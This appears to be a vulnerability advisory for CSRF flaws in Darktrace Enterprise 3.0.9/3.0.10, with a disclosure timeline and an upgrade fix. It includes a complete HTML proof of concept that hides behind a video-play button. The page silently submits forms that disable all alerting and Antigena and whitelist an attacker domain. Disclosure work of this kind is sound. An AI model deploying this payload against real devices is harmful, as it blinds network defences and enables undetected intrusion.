@@ -1,0 +1,157 @@
+id: 32763
+date: 05/22/2019
+title: Darktrace Enterprise Immune System 3.0.9 / 3.0.10 Cross Site Request Forgery Vulnerability
+author: Gerwout Van der Veen
+cves: CVE-2019-9596, CVE-2019-9597
+
+1 - Vulnerability
+Darktrace Enterprise Immune System 3.0.9 and 3.0.10 contains multiple
+cross site request forgery vulnerabilities. It is highly likely that
+older versions are affected as well, but this has not been confirmed.
+An attacker can whitelist domains and/or change core Darktrace
+configuration. The below proof of concept whitelists
+www.evilhackers.com, completely disables all types of alerting and it
+disables the Antigena component.
+
+Proof of Concept:
+
+<html>
+<head>
+<title>Darktrace POC - CVE-2019-9596 and CVE-2019-9597</title>
+<script>
+var myVideo;
+var attackWindow;
+var attackWindow2;
+function playPauseAndExploit() {
+  if (myVideo.paused) {
+attackWindow = window.open('about:blank', 'formwindow',
+'scrollbars=no,menubar=no,location=no,titlebar=no,height=100,width=100,resizable=no,toolbar=no,status=no');
+attackWindow2 = window.open('about:blank', 'form2window',
+'scrollbars=no,menubar=no,location=no,titlebar=no,height=100,width=100,resizable=no,toolbar=no,status=no');
+document.getElementById("disable-anti-gena").submit();
+document.getElementById("white-list-evil-domain").submit();
+myVideo.play();
+setTimeout(function(){ attackWindow.close(); attackWindow2.close()}, 1000);
+  }
+  else {
+myVideo.pause();
+  }
+}
+document.addEventListener('DOMContentLoaded', function () {
+myVideo = document.getElementById("video1");
+}, false);
+</script>
+</head>
+<body>
+<div style="text-align:center">
+  <button onclick="playPauseAndExploit();">Play/Pause Video</button>
+  <br><br>
+  <video id="video1" width="800">
+<source src="<link towards video file>" type="video/mp4">
+Your browser does not support HTML5 video.
+  </video>
+</div>
+<form id="disable-anti-gena" target="formwindow" method="post"
+action="<domain or ip Darktrace device>/config/">
+<input type="hidden" name="AntigenaNetwork" value="false"/>
+<input type="hidden" name="HTTPAlerts" value="false"/>
+<input type="hidden" name="ActiveMQAlerts" value="false"/>
+<input type="hidden" name="CEFSyslogAlerts" value="false"/>
+<input type="hidden" name="EmailAlerts" value="false"/>
+<input type="hidden" name="JSONSyslogAlerts" value="false"/>
+<input type="hidden" name="LEEFSyslogAlerts" value="false"/>
+<input type="hidden" name="MobileAppAlerts" value="false"/>
+</form>
+<form id="white-list-evil-domain" target="form2window" method="post"
+action="<domain or ip Darktrace device>/whitelisteddomains">
+<input type="hidden" name="newdomain" value="www.evilhackers.com"/>
+</form>
+</body>
+</html>
+
+2 - CVE references
+CVE-2019-9596 CSRF /whitelisteddomains
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9596
+CVE-2019-9597 CSRF /config
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9597
+
+3 - Vendor
+Darktrace Enterprise is Darktrace’s flagship AI cyber defense
+solution. It combines real-time threat detection, network
+visualization, and advanced investigation capabilities in a single
+unified system that is fast and easy to install.
+
+Using proprietary machine learning and AI algorithms, Darktrace
+Enterprise works by passively analyzing raw network traffic to form an
+evolving understanding of ‘normal’ for every user, device, and subnet
+in an organization. Without presuming to know in advance what activity
+is ‘malicious’ or not, Darktrace Enterprise independently learns to
+detect significant deviations, and immediately alerts the organization
+to emerging threats – from subtle insiders and low-and-slow attacks,
+through to automated viruses like ransomware.
+
+4 - Timeline
+04 December 2018
+Notified Darktrace about the discovered vulnerabilities in version
+3.0.9 and asked them how to share the vulnerability details.
+
+05 December 2018
+Discussed details on the phone with a Darktrace employee. Forwarded
+the proof of concept for further investigation.
+
+07 December 2018
+Darktrace confirmed the findings. Development team was involved to
+resolve the issues.
+Update 3.0.10 released to mitigate these issues (i.e. add SameSite lax
+cookie support for the session cookie)
+
+10 December 2018
+Notified Darktrace that it is still possible to exploit GET requests
+(possible on some of the actions on the /config endpoint), because
+SameSite property is set to lax. Also mentioned that SameSite is not
+fully supported in older browsers. A GET CSRF proof of concept was
+sent for further investigation. Received response, stating they are
+still working on a permanent fix, but need more time to get this fully
+resolved. I suggested enabling strict mode for the SameSite cookie to
+further mitigate this issue. This would be a breaking change for the
+integration of some SIEM‍ systems that work together with Darktrace.
+Darktrace did confirm that the permanent fix should be part of the
+upcoming 3.1 release.
+
+04 January 2019
+Asked for an eta on the 3.1 release. Got a response that the expected
+release date would be at some point in January
+
+26 February 2019
+Asked for an eta on the 3.1 release
+
+06 March 2019
+Got a response the the release was unfortunately delayed. Registered
+CVE-2019-9596 and CVE-2019-9597 with Mitre.
+
+07 March 2019
+Asked for an eta on the 3.1 release. Was informed that a release
+candidate was ready to be tested. Darktrace also asked I would be
+willing to delay publication of the vulnerabilities until 30 days
+after the 3.1 release. This would give their customers a reasonable
+time frame to upgrade their device. I agreed, given a rapid release of
+the final fix.
+
+18 March 2019
+Started testing the release candidate and confirmed that the CSRF
+issues have all been fully resolved.
+
+01 April 2019
+Darktrace releases 3.1 update
+
+
+5 - Credit
+Gerwout van der Veen, eVision Software https://www.evision-software.com
+
+6 - Solution
+Upgrade to 3.1 or later release
+
+More details, including a video from the proof of concept is available
+at this link: https://www.peerlyst.com/posts/exploiting-two-zero-days-in-a-darktrace-appliance-cve-2019-9596-and-cve-2019-9597-gerwout-van-der-veen
+
+#  0day.today [2023-03-27]  #
